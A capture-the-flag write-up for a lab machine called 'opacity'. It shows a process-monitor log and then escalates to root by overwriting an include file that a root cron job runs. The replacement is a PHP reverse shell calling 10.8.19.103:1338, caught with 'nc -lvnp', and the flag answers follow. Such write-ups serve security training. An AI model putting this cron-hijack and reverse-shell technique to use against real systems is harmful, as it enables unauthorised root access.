2023/04/10 00:29:16 CMD: UID=33    PID=13304  | /usr/sbin/apache2 -k start 
2023/04/10 00:29:16 CMD: UID=33    PID=2886   | /bin/bash 
2023/04/10 00:29:16 CMD: UID=33    PID=2885   | python3 -c import pty;pty.spawn("/bin/bash") 
2023/04/10 00:29:16 CMD: UID=33    PID=2881   | sh 
2023/04/10 00:29:16 CMD: UID=33    PID=2880   | sh -c sh 
2023/04/10 00:29:16 CMD: UID=0     PID=2725   | 
2023/04/10 00:29:16 CMD: UID=33    PID=2291   | /usr/sbin/apache2 -k start 
2023/04/10 00:29:16 CMD: UID=0     PID=890    | /usr/sbin/smbd --foreground --no-process-group 
2023/04/10 00:29:16 CMD: UID=0     PID=877    | /usr/sbin/smbd --foreground --no-process-group 
2023/04/10 00:29:16 CMD: UID=0     PID=876    | /usr/sbin/smbd --foreground --no-process-group 
2023/04/10 00:29:16 CMD: UID=0     PID=807    | /usr/sbin/smbd --foreground --no-process-group 
2023/04/10 00:29:16 CMD: UID=33    PID=801    | php-fpm: pool www                                                             
2023/04/10 00:29:16 CMD: UID=33    PID=800    | php-fpm: pool www                                                             
2023/04/10 00:29:16 CMD: UID=0     PID=760    | /usr/sbin/apache2 -k start 
2023/04/10 00:29:16 CMD: UID=0     PID=744    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
2023/04/10 00:29:16 CMD: UID=0     PID=723    | /usr/sbin/ModemManager 
2023/04/10 00:29:16 CMD: UID=0     PID=678    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2023/04/10 00:29:16 CMD: UID=0     PID=639    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2023/04/10 00:29:16 CMD: UID=0     PID=637    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
2023/04/10 00:29:16 CMD: UID=1     PID=629    | /usr/sbin/atd -f 
2023/04/10 00:29:16 CMD: UID=0     PID=626    | /usr/lib/udisks2/udisksd 
2023/04/10 00:29:16 CMD: UID=0     PID=621    | /lib/systemd/systemd-logind 
2023/04/10 00:29:16 CMD: UID=0     PID=619    | /usr/lib/snapd/snapd 
2023/04/10 00:29:16 CMD: UID=104   PID=617    | /usr/sbin/rsyslogd -n -iNONE 
2023/04/10 00:29:16 CMD: UID=0     PID=614    | /usr/lib/policykit-1/polkitd --no-debug 
2023/04/10 00:29:16 CMD: UID=0     PID=612    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       
2023/04/10 00:29:16 CMD: UID=0     PID=610    | /usr/sbin/nmbd --foreground --no-process-group 
2023/04/10 00:29:16 CMD: UID=0     PID=606    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
2023/04/10 00:29:16 CMD: UID=103   PID=594    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2023/04/10 00:29:16 CMD: UID=0     PID=591    | /usr/sbin/cron -f 
2023/04/10 00:29:16 CMD: UID=0     PID=584    | /usr/bin/amazon-ssm-agent 
2023/04/10 00:29:16 CMD: UID=0     PID=583    | /usr/lib/accountsservice/accounts-daemon 
2023/04/10 00:29:16 CMD: UID=101   PID=572    | /lib/systemd/systemd-resolved 
2023/04/10 00:29:16 CMD: UID=100   PID=569    | /lib/systemd/systemd-networkd 
2023/04/10 00:29:16 CMD: UID=102   PID=536    | /lib/systemd/systemd-timesyncd 
2023/04/10 00:29:16 CMD: UID=0     PID=516    | 
2023/04/10 00:29:16 CMD: UID=0     PID=515    | 
2023/04/10 00:29:16 CMD: UID=0     PID=508    | 
2023/04/10 00:29:16 CMD: UID=0     PID=507    | 
2023/04/10 00:29:16 CMD: UID=0     PID=506    | 
2023/04/10 00:29:16 CMD: UID=0     PID=502    | 
2023/04/10 00:29:16 CMD: UID=0     PID=499    | 
2023/04/10 00:29:16 CMD: UID=0     PID=497    | 
2023/04/10 00:29:16 CMD: UID=0     PID=489    | /sbin/multipathd -d -s 
2023/04/10 00:29:16 CMD: UID=0     PID=488    | 
2023/04/10 00:29:16 CMD: UID=0     PID=487    | 
2023/04/10 00:29:16 CMD: UID=0     PID=486    | 
2023/04/10 00:29:16 CMD: UID=0     PID=485    | 
2023/04/10 00:29:16 CMD: UID=0     PID=378    | /lib/systemd/systemd-udevd 
2023/04/10 00:29:16 CMD: UID=0     PID=344    | /lib/systemd/systemd-journald 
2023/04/10 00:29:16 CMD: UID=0     PID=274    | 
2023/04/10 00:29:16 CMD: UID=0     PID=273    | 
2023/04/10 00:29:16 CMD: UID=0     PID=226    | 
2023/04/10 00:29:16 CMD: UID=0     PID=189    | 
2023/04/10 00:29:16 CMD: UID=0     PID=157    | 
2023/04/10 00:29:16 CMD: UID=0     PID=122    | 
2023/04/10 00:29:16 CMD: UID=0     PID=109    | 
2023/04/10 00:29:16 CMD: UID=0     PID=106    | 
2023/04/10 00:29:16 CMD: UID=0     PID=97     | 
2023/04/10 00:29:16 CMD: UID=0     PID=96     | 
2023/04/10 00:29:16 CMD: UID=0     PID=95     | 
2023/04/10 00:29:16 CMD: UID=0     PID=93     | 
2023/04/10 00:29:16 CMD: UID=0     PID=92     | 
2023/04/10 00:29:16 CMD: UID=0     PID=91     | 
2023/04/10 00:29:16 CMD: UID=0     PID=90     | 
2023/04/10 00:29:16 CMD: UID=0     PID=89     | 
2023/04/10 00:29:16 CMD: UID=0     PID=88     | 
2023/04/10 00:29:16 CMD: UID=0     PID=87     | 
2023/04/10 00:29:16 CMD: UID=0     PID=86     | 
2023/04/10 00:29:16 CMD: UID=0     PID=84     | 
2023/04/10 00:29:16 CMD: UID=0     PID=83     | 
2023/04/10 00:29:16 CMD: UID=0     PID=79     | 
2023/04/10 00:29:16 CMD: UID=0     PID=78     | 
2023/04/10 00:29:16 CMD: UID=0     PID=77     | 
2023/04/10 00:29:16 CMD: UID=0     PID=76     | 
2023/04/10 00:29:16 CMD: UID=0     PID=75     | 
2023/04/10 00:29:16 CMD: UID=0     PID=74     | 
2023/04/10 00:29:16 CMD: UID=0     PID=73     | 
2023/04/10 00:29:16 CMD: UID=0     PID=72     | 
2023/04/10 00:29:16 CMD: UID=0     PID=71     | 
2023/04/10 00:29:16 CMD: UID=0     PID=70     | 
2023/04/10 00:29:16 CMD: UID=0     PID=24     | 
2023/04/10 00:29:16 CMD: UID=0     PID=23     | 
2023/04/10 00:29:16 CMD: UID=0     PID=22     | 
2023/04/10 00:29:16 CMD: UID=0     PID=21     | 
2023/04/10 00:29:16 CMD: UID=0     PID=20     | 
2023/04/10 00:29:16 CMD: UID=0     PID=19     | 
2023/04/10 00:29:16 CMD: UID=0     PID=18     | 
2023/04/10 00:29:16 CMD: UID=0     PID=17     | 
2023/04/10 00:29:16 CMD: UID=0     PID=16     | 
2023/04/10 00:29:16 CMD: UID=0     PID=15     | 
2023/04/10 00:29:16 CMD: UID=0     PID=14     | 
2023/04/10 00:29:16 CMD: UID=0     PID=12     | 
2023/04/10 00:29:16 CMD: UID=0     PID=11     | 
2023/04/10 00:29:16 CMD: UID=0     PID=10     | 
2023/04/10 00:29:16 CMD: UID=0     PID=9      | 
2023/04/10 00:29:16 CMD: UID=0     PID=8      | 
2023/04/10 00:29:16 CMD: UID=0     PID=6      | 
2023/04/10 00:29:16 CMD: UID=0     PID=4      | 
2023/04/10 00:29:16 CMD: UID=0     PID=3      | 
2023/04/10 00:29:16 CMD: UID=0     PID=2      | 
2023/04/10 00:29:16 CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
2023/04/10 00:30:01 CMD: UID=0     PID=27658  | /usr/sbin/CRON -f 
2023/04/10 00:30:01 CMD: UID=0     PID=27657  | /usr/sbin/CRON -f 
2023/04/10 00:30:02 CMD: UID=0     PID=27659  | /usr/bin/php /home/sysadmin/scripts/script.php 
2023/04/10 00:31:01 CMD: UID=0     PID=27661  | /usr/sbin/CRON -f 
2023/04/10 00:31:01 CMD: UID=0     PID=27660  | /usr/sbin/CRON -f 
2023/04/10 00:31:01 CMD: UID=0     PID=27662  | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 
2023/04/10 00:32:01 CMD: UID=0     PID=27665  | /usr/sbin/CRON -f 
2023/04/10 00:32:01 CMD: UID=0     PID=27664  | /usr/sbin/CRON -f 
2023/04/10 00:32:01 CMD: UID=0     PID=27666  | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 
2023/04/10 00:33:01 CMD: UID=0     PID=27669  | /usr/sbin/CRON -f 
2023/04/10 00:33:01 CMD: UID=0     PID=27668  | /usr/sbin/CRON -f 
2023/04/10 00:33:01 CMD: UID=0     PID=27670  | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 

sysadmin@opacity:/tmp$ cd /home/sysadmin/scripts/
sysadmin@opacity:~/scripts$ ls
lib  script.php
sysadmin@opacity:~/scripts$ cat script.php 
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>

sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
<?php


ini_set('max_execution_time', 600);
ini_set('memory_limit', '1024M');


function zipData($source, $destination) {
	if (extension_loaded('zip')) {
		if (file_exists($source)) {
			$zip = new ZipArchive();
			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
				$source = realpath($source);
				if (is_dir($source)) {
					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
					foreach ($files as $file) {
						$file = realpath($file);
						if (is_dir($file)) {
							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
						} else if (is_file($file)) {
							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
						}
					}
				} else if (is_file($source)) {
					$zip->addFromString(basename($source), file_get_contents($source));
				}
			}
			return $zip->close();
		}
	}
	return false;
}
?>

sysadmin@opacity:~/scripts/lib$ rm backup.inc.php
rm: remove write-protected regular file 'backup.inc.php'? yes
sysadmin@opacity:~/scripts/lib$ ls
application.php     dataresource.php  owlapi.php  registry.php
bio2rdfapi.php      dataset.php       phplib.php  utils.php
biopax2bio2rdf.php  fileapi.php       rdfapi.php  xmlapi.php
sysadmin@opacity:~/scripts/lib$ nano backup.inc.php
sysadmin@opacity:~/scripts/lib$ tail backup.inc.php 
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1338);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvnp 1338 
listening on [any] 1338 ...
connect to [10.8.19.103] from (UNKNOWN) [10.10.142.194] 46062
SOCKET: Shell has connected! PID: 27916
whoami
root
cd /root
ls
proof.txt
snap
cat proof.txt
ac0d56f93202dd57dcb2498c739fd20e
cd snap
ls
lxd


```


![[Pasted image 20230409182615.png]]

![[Pasted image 20230409184553.png]]
![[Pasted image 20230409192348.png]]
![[Pasted image 20230409192438.png]]

What is the  local.txt flag?

*6661b61b44d234d230d06bf5b3c075e2*

What is the proof.txt flag?

*ac0d56f93202dd57dcb2498c739fd20e*


[[PWN101]]




















[[PWN101]]